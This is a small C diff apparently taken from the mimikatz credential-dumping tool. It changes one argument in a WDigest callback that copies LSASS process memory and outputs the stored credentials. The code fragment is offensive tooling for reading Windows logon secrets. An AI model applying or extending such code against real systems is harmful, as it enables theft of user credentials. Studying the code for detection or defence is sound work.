@@ -52,7 +52,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKIWI_BASIC_SECURIT
 			if(aLocalMemory.address = LocalAlloc(LPTR, taille))
 			{
 				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, taille))
-					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + offsetWDigestPrimary), pData->LogonId, 0);
+					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + offsetWDigestPrimary), pData, 0);
 				LocalFree(aLocalMemory.address);
 			}
 		}
